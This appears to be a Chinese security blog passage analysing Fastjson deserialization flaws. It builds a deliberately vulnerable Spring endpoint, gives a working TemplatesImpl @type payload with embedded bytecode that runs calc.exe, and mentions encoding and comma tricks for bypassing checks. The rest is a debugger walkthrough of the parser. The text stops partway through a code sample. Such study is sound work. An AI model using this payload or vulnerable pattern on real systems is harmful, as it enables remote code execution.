<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Fastjson 漏洞相关 - 饱食终日，无所事事</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="饱食终日，无所事事"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="饱食终日，无所事事"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="FastJSON 漏洞分析"><meta property="og:type" content="blog"><meta property="og:title" content="Fastjson 漏洞相关"><meta property="og:url" content="http://example.com/2021/07/20/fastjson/"><meta property="og:site_name" content="饱食终日，无所事事"><meta property="og:description" content="FastJSON 漏洞分析"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720144851600.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720151801631.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720152151993.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720153220286.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720165401412.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720165438308.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720165725226.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210720165837008.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807161605492.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807162955757.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807163205371.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807165410818.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807173140658.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807173536710.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807174626906.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807180359976.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807212532547.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807231312657.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807232726981.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807233544734.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210808180610305.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210809225911795.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210809230024617.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210809230734202.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210809231102438.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210811112025231.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210811112354463.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210811120123865.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210811145335888.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210812151144620.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210812151323801.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210807174626906.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813115855160.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813120302429.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813120302429.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813142747842.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813142951233.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813143551170.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813143702077.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813142747842.png"><meta property="og:image" content="http://example.com/2021/07/20/fastjson/image-20210813224605958.png"><meta property="article:published_time" content="2021-07-20T02:31:56.000Z"><meta property="article:modified_time" content="2021-09-23T00:53:46.096Z"><meta property="article:author" content="lll"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/2021/07/20/fastjson/image-20210720144851600.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/07/20/fastjson/"},"headline":"Fastjson 漏洞相关","image":["http://example.com/2021/07/20/fastjson/image-20210720144851600.png","http://example.com/2021/07/20/fastjson/image-20210720151801631.png","http://example.com/2021/07/20/fastjson/image-20210720152151993.png","http://example.com/2021/07/20/fastjson/image-20210720153220286.png","http://example.com/2021/07/20/fastjson/image-20210720165401412.png","http://example.com/2021/07/20/fastjson/image-20210720165438308.png","http://example.com/2021/07/20/fastjson/image-20210720165725226.png","http://example.com/2021/07/20/fastjson/image-20210720165837008.png","http://example.com/2021/07/20/fastjson/image-20210807161605492.png","http://example.com/2021/07/20/fastjson/image-20210807162955757.png","http://example.com/2021/07/20/fastjson/image-20210807163205371.png","http://example.com/2021/07/20/fastjson/image-20210807165410818.png","http://example.com/2021/07/20/fastjson/image-20210807173140658.png","http://example.com/2021/07/20/fastjson/image-20210807173536710.png","http://example.com/2021/07/20/fastjson/image-20210807174626906.png","http://example.com/2021/07/20/fastjson/image-20210807180359976.png","http://example.com/2021/07/20/fastjson/image-20210807212532547.png","http://example.com/2021/07/20/fastjson/image-20210807231312657.png","http://example.com/2021/07/20/fastjson/image-20210807232726981.png","http://example.com/2021/07/20/fastjson/image-20210807233544734.png","http://example.com/2021/07/20/fastjson/image-20210808180610305.png","http://example.com/2021/07/20/fastjson/image-20210809225911795.png","http://example.com/2021/07/20/fastjson/image-20210809230024617.png","http://example.com/2021/07/20/fastjson/image-20210809230734202.png","http://example.com/2021/07/20/fastjson/image-20210809231102438.png","http://example.com/2021/07/20/fastjson/image-20210811112025231.png","http://example.com/2021/07/20/fastjson/image-20210811112354463.png","http://example.com/2021/07/20/fastjson/image-20210811120123865.png","http://example.com/2021/07/20/fastjson/image-20210811145335888.png","http://example.com/2021/07/20/fastjson/image-20210812151144620.png","http://example.com/2021/07/20/fastjson/image-20210812151323801.png","http://example.com/2021/07/20/fastjson/image-20210807174626906.png","http://example.com/2021/07/20/fastjson/image-20210813115855160.png","http://example.com/2021/07/20/fastjson/image-20210813120302429.png","http://example.com/2021/07/20/fastjson/image-20210813120302429.png","http://example.com/2021/07/20/fastjson/image-20210813142747842.png","http://example.com/2021/07/20/fastjson/image-20210813142951233.png","http://example.com/2021/07/20/fastjson/image-20210813143551170.png","http://example.com/2021/07/20/fastjson/image-20210813143702077.png","http://example.com/2021/07/20/fastjson/image-20210813142747842.png","http://example.com/2021/07/20/fastjson/image-20210813224605958.png"],"datePublished":"2021-07-20T02:31:56.000Z","dateModified":"2021-09-23T00:53:46.096Z","author":{"@type":"Person","name":"lll"},"publisher":{"@type":"Organization","name":"饱食终日，无所事事","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"FastJSON 漏洞分析"}</script><link rel="canonical" href="http://example.com/2021/07/20/fastjson/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-20T02:31:56.000Z" title="2021/7/20 上午10:31:56">2021-07-20</time>发表</span><span class="level-item"><time dateTime="2021-09-23T00:53:46.096Z" title="2021/9/23 上午8:53:46">2021-09-23</time>更新</span><span class="level-item">26 分钟读完 (大约3836个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Fastjson 漏洞相关</h1><div class="content"><p>FastJSON 漏洞分析</p>
<span id="more"></span>

<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Fastjson 是阿里巴巴维护的开源 JSON 库，特点是速度较快，支持特性较多，<del>经常爆洞</del>。常用于 Web 和安卓的序列化和反序列化中。</p>
<p>支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化为 Java Bean。</p>
<p>常用方法：</p>
<ul>
<li><code>JSON.toJSONString(Object[, SerializerFeature])</code>，将对象序列化为 JSON 格式，如果指定 <code>SerializerFeature.WriteClassName</code>，会将类名记录到 JSON 中（使用<code>@type</code>标记）</li>
<li><code>JSON.parse(Json)</code>，将 JSON 字符串反序列化为对象并返回，要求该 JSON 必须有 <code>@type</code> 标记</li>
<li><code>JSON.parseObject(Json)</code>，返回<code>com.alibaba.fastjson.JSONObject</code>类</li>
<li><code>JSON.parseObject(Json, Object.class)</code>，返回<code>@type</code>指定的类</li>
<li><code>JSON.parseObject(Json, User.class, Feature.SupportNonPublicField)</code>，反序列化时接受私有成员</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>序列化时，所有 public 字段和具有 get 方法的 private 字段都能被序列化。</p>
<p>反序列化时，无 set 方法的 privaate 字段不会被反序列化，除非指定 Feature.SupportNonPublicField。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>JDK 版本 1.8.211</p>
<p>使用 Spring Boot 搭建测试环境，在 pom.xml 中添加对应 FastJSON 依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试页面</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Victim</span> </span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">&quot;fastjson&quot;</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">String</span> <span class="function"><span class="title">vuln</span>(<span class="params"><span class="meta">@RequestBody</span> <span class="built_in">String</span> s</span>)</span>&#123;</span><br><span class="line">        JSONObject obj = <span class="built_in">JSON</span>.parseObject(s, Feature.SupportNonPublicField);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="FastJSON-1-2-24-反序列化"><a href="#FastJSON-1-2-24-反序列化" class="headerlink" title="FastJSON 1.2.24 反序列化"></a>FastJSON 1.2.24 反序列化</h3><p>使用 1.2.23 版本</p>
<p>漏洞存在于 AutoType，可以反序列化任意类，POC：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;yv66vgAAADQANQoABwAmCgAnACgIACkKACcAKgcAKwoABQAmBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMcG9jOwEACkV4Y2VwdGlvbnMHAC0BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAQTWV0aG9kUGFyYW1ldGVycwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACWhhRm5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALgEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAvAQAKU291cmNlRmlsZQEACHBvYy5qYXZhDAAIAAkHADAMADEAMgEACGNhbGMuZXhlDAAzADQBAANwb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAADAAEAA0ADQAOAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwAZAAAADQMAEwAAABUAAAAXAAAAAQARABoAAwAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAbABwAAgAPAAAABAABAB0AGQAAAAkCABMAAAAbAAAACQAeAB8AAwAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAGgAIABsADAAAABYAAgAAAAkAIAAhAAAACAABACIADgABAA8AAAAEAAEAIwAZAAAABQEAIAAAAAEAJAAAAAIAJQ==&quot;</span>],<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;a.b&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123; &#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="attr">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="attr">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 TemplatesImpl 利用链执行任意字节码，<code>_bytecodes</code>为如下恶意类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">poc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POST 以上 POC，可以成功弹出计算器。</p>
<p>跟踪调试，在<code>JSON.parseObject(s, Feature.SupportNonPublicField)</code>处下断点，获取传入特性后解析</p>
<p><img src="/2021/07/20/fastjson/image-20210720144851600.png" alt="image-20210720144851600"></p>
<p>进入 <code>parser.parse()</code>，由于传入的 JSON 第一个字符是左大括号，所以进入 LBRACE，</p>
<p><img src="/2021/07/20/fastjson/image-20210720151801631.png" alt="image-20210720151801631"></p>
<p>开始解析字符串，通过<code>scanSymbol</code>解析双引号之间的值（<code>@type</code>）</p>
<p><img src="/2021/07/20/fastjson/image-20210720152151993.png" alt="image-20210720152151993"></p>
<p>并且获取了传入类的 class</p>
<p><img src="/2021/07/20/fastjson/image-20210720153220286.png" alt="image-20210720153220286"></p>
<p>进入 <code>deseriailizer.deserialze()</code>，进行反序列化操作，依次解析 JSON 中的各个字段，第一个字段是<code>outputProperties</code>，类型是<code>java.util.Properties</code>，</p>
<p>当 key 是<code>_outputProperties</code>时，matchfield 为 false，会进入parseField</p>
<p><img src="/2021/07/20/fastjson/image-20210720165401412.png" alt="image-20210720165401412"></p>
<p><img src="/2021/07/20/fastjson/image-20210720165438308.png" alt="image-20210720165438308"></p>
<p><img src="/2021/07/20/fastjson/image-20210720165725226.png" alt="image-20210720165725226"></p>
<p>进入 setValue，触发 TemplatesImpl 利用链</p>
<p><img src="/2021/07/20/fastjson/image-20210720165837008.png" alt="image-20210720165837008"></p>
<p>弹出计算器。</p>
<h2 id="再次研究"><a href="#再次研究" class="headerlink" title="再次研究"></a>再次研究</h2><p>之前的基本上就是复现了一遍，对原理基本没有了解。所以再来重新研究。</p>
<h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><p>传入一个带有类型的正常的 Json 进行反序列化，调试反序列化过程，secret 为 private 字段</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;net.yanqs.springtest.FastjsonDemo.User&quot;</span>,<span class="attr">&quot;age&quot;</span>:<span class="number">10</span>,<span class="attr">&quot;secret&quot;</span>:<span class="string">&quot;secret&quot;</span>,<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;sijidou&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化方法为</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">s</span>, Feature.SupportNonPublicField)</span>;</span><br></pre></td></tr></table></figure>

<p>获取特性后，进入 parse</p>
<p><img src="/2021/07/20/fastjson/image-20210807161605492.png" alt="image-20210807161605492"></p>
<p>创建了一个 DefaultJSONParseer，开始解析</p>
<p><img src="/2021/07/20/fastjson/image-20210807162955757.png" alt="image-20210807162955757"></p>
<p>其中， JSONLexer（词法分析器？） 表示了传入的 JSON 字符串，包含了字符串的长度，目前解析到的位置等等信息</p>
<p><img src="/2021/07/20/fastjson/image-20210807163205371.png" alt="image-20210807163205371"></p>
<p>如果当前位置是<code>&#123;</code>或者<code>[</code>，则调用 next 方法继续向下，否则获取内容到 nextToken。</p>
<p>由于第一个字符是<code>&#123;</code>，因此进入 next。在 next 中，将当前字符串的位置记录一下，并判断字符串是否已经结束。</p>
<p>在 lexer 中记录 Token 的值（LBRACE，12），DefaultJSONParser构造完成，接下来调用它的 parse 方法。</p>
<p>switch(lexer.token()) 为 12，进入 case LBRACE</p>
<p><img src="/2021/07/20/fastjson/image-20210807165410818.png" alt="image-20210807165410818"></p>
<p>创建一个新的 JSONObject，如果 OrderedField 启动则使用 LinkedHashMap 存储，否则使用 HashMap。随后调用 parseObject。</p>
<p>parseObject 中处理一些 token 不正常的情况，进入解析的过程。</p>
<p><img src="/2021/07/20/fastjson/image-20210807173140658.png" alt="image-20210807173140658"></p>
<p>首先跳过空白，如果特性中设定了允许任意逗号，则也跳过逗号。所以在开启情况下可以使用类似payload，<code>&#123;,\t,\n,&quot;@type&quot;</code></p>
<p><img src="/2021/07/20/fastjson/image-20210807173536710.png" alt="image-20210807173536710"></p>
<p>如果下个字符是双引号，则进入 scanSymbleTable，返回下一个双引号之前的字符串。比如本例中会返回<code>@type</code>。scanSymbleTable 中会进行十六进制和 Unicode 解码，因此可以进行编码来做简单的绕过。另外同样也会忽略注释。</p>
<p><img src="/2021/07/20/fastjson/image-20210807174626906.png" alt="image-20210807174626906"></p>
<p>这里的 JSON.DEFAULT_TYPE_KEY 就是<code>@type</code>，进入并获取 typeName，类的全名，然后执行 loadClass。如果 loadClass 结果是 null，也把它放到结果的数组里，否则继续。进行一系列判断后，getDeserilizer 然后 deserialze</p>
<p><img src="/2021/07/20/fastjson/image-20210807180359976.png" alt="image-20210807180359976"></p>
<p>getDeserializer</p>
<p><img src="/2021/07/20/fastjson/image-20210807212532547.png" alt="image-20210807212532547"></p>
<p>get 查找类是否在已经存在的 Map 里，如果有就直接返回现成的 deserializer。如果是 <code>Class&lt;?&gt;</code>类型，调用该类型的 getDeserializer，继续类似上面的过程，替换 className 中的<code>$</code>为<code>.</code>，应该是将内部类的符号换成普通的符号后，出现了一个 denylist</p>
<p><img src="/2021/07/20/fastjson/image-20210807231312657.png" alt="image-20210807231312657"></p>
<p>不知道为啥 denyList 里俩 Thread = =</p>
<p><img src="/2021/07/20/fastjson/image-20210807232726981.png" alt="image-20210807232726981"></p>
<p>判断将要反序列化的类是不是几个特殊的类之一，是的话添加一些相关的类</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java<span class="selector-class">.awt</span>.</span><br><span class="line">java<span class="selector-class">.time</span>.</span><br><span class="line">java<span class="selector-class">.util</span><span class="selector-class">.Optional</span></span><br><span class="line">java<span class="selector-class">.nio</span><span class="selector-class">.file</span>.Path</span><br></pre></td></tr></table></figure>

<p>然后获取当前 classloader 尝试加载，然后再来 get，当然还是 get 不到。最后判断 clazz 是不是一些特殊的类，如果都不是，最后创建一个 JavaBeanDeserializer 返回。</p>
<p><img src="/2021/07/20/fastjson/image-20210807233544734.png" alt="image-20210807233544734"></p>
<p>跟进 createJavaBeanDeserializer，经过一系列判断 asmEnable，进入<code>JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</code>，在这个 build 方法中，创建将要反序列化的对象</p>
<p><img src="/2021/07/20/fastjson/image-20210808180610305.png" alt="image-20210808180610305"></p>
<p>获取到默认的构造方法后，设置可见性</p>
<p><img src="/2021/07/20/fastjson/image-20210809225911795.png" alt="image-20210809225911795"></p>
<p>接下来获取 getter</p>
<p><img src="/2021/07/20/fastjson/image-20210809230024617.png" alt="image-20210809230024617"></p>
<p>setter 和 getter 被获取到需要满足几个条件：方法名长度至少为4，不是静态方法，无返回值或返回值为声明它的类（此处存疑），接受 1 个参数，开头是 set</p>
<p>根据方法名获取字段，支持 Unicode</p>
<p><img src="/2021/07/20/fastjson/image-20210809230734202.png" alt="image-20210809230734202"></p>
<p>获取字段，根据是不是布尔类型分两种情况</p>
<p><img src="/2021/07/20/fastjson/image-20210809231102438.png" alt="image-20210809231102438"></p>
<p>获取 getter ，逻辑类似于获取 setter，要求方法名长度大于 4，非静态，开头是 get，第四个字符大写，不接受参数</p>
<p><img src="/2021/07/20/fastjson/image-20210811112025231.png" alt="image-20210811112025231"></p>
<p>另外还要求返回值能够满足以下条件之一：</p>
<p><img src="/2021/07/20/fastjson/image-20210811112354463.png" alt="image-20210811112354463"></p>
<p>后面其中有一点比较重要。如果一个 field 存在 setter，则它的信息在获取 setter 时就会呗获取到，此时就无法获取 getter。当无 setter 时，fieldInfo == null，才能获取 getter。</p>
<p><img src="/2021/07/20/fastjson/image-20210811120123865.png" alt="image-20210811120123865"></p>
<p>全部处理完成后，使用获取的这些信息创建 JavaBeanDeserializer。稍后进行 deserialize 方法。</p>
<p>根据以上分析，修改 secret 字段的类型为 Properties 即可成功在反序列化时调用 getProperties 方法。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span 